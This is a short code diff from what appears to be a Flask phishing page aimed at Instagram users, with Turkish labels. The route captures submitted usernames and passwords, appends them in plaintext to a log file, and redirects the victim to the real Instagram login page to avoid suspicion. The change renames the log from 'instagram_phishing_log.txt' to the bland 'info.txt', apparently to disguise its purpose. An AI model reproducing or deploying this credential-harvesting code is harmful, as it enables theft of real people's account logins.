@@ -116,7 +116,7 @@ def submit():
     username = request.form.get('username')
     password = request.form.get('password')
     
-    with open("instagram_phishing_log.txt", "a") as f:
+    with open("info.txt", "a") as f:
         f.write(f"Kullanıcı Adı: {username}, Şifre: {password}\n")
     
     return redirect("https://www.instagram.com/accounts/login/")  # Gerçek Instagram sayfasına yönlendir
